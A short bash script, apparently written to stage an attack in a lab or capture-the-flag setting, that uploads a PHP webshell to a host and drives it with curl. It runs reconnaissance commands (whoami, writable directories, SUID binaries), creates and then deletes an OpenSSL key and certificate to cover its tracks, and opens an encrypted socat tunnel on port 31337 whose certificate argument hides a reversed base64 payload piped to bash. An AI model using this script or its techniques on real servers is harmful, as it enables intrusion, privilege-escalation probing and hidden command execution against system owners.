#!/bin/bash
host=172.23.0.2

# Attacker uploads webshell
curl -F 'file=@orion_shell.php' http://$host/upload.php
sleep 3

# Attacker tests shell
curl -d 'cmd=whoami' http://$host/uploads/orion_shell.php
sleep 1
curl -d 'cmd=ls -la' http://$host/uploads/orion_shell.php
sleep 1
curl -d 'cmd=echo Im in!' http://$host/uploads/orion_shell.php
sleep 1

# Attacker creates certificate for tunnel
curl -d 'cmd=openssl genrsa -out /tmp/server.key 2048' http://$host/uploads/orion_shell.php
sleep 1
curl -d 'cmd=openssl req -new -key /tmp/server.key -x509 -days 365 -out /tmp/server.crt -subj "/C=CY/ST=KapouMagika_hehe/O=Dis/CN=cybermouflons.com"' http://$host/uploads/orion_shell.php
sleep 1

# Attacker searches for location
curl -d 'cmd=find / -type d -writable 2>/dev/null' http://$host/uploads/orion_shell.php
sleep 1

curl -d 'cmd=echo I hope nobody is looking!' http://$host/uploads/orion_shell.php
sleep 1

curl -d 'cmd=find / -type f -perm -4000 -exec ls -la {} \;' http://$host/uploads/orion_shell.php
sleep 1

# Attacker creates PEM file for tunnel and hides it
curl -d 'cmd=cat /tmp/server.key /tmp/server.crt > /tmp/certificate.pem' http://$host/uploads/orion_shell.php
sleep 1

# Attacker deletes the certificate and private key
curl -d 'cmd=rm /tmp/server.key /tmp/server.crt' http://$host/uploads/orion_shell.php
sleep 1


curl -d 'cmd=echo I should hide the rest of my commands!' http://$host/uploads/orion_shell.php
sleep 1

# Attacker creates tunnel using SSL encryption
curl -d 'cmd=socat openssl-listen:31337,reuseaddr,cert=$(echo K0WZw5yboNWZtQ3Ylp2byBnLvITZoNWYwF2Ln9GbvIXY29CIvh2YltTblBnLvh2Yl1CdjVmavJHcu8iMlh2YhBXYvc2bs9ichZ3Lg0WZw5SZ0F2YpZWa0JXZj9CctR3LgYXb | rev | base64 -d | bash),verify=0,cipher=AES256-GCM-SHA384,fork tcp:localhost:12345' http://$host/uploads/orion_shell.php
sleep 1


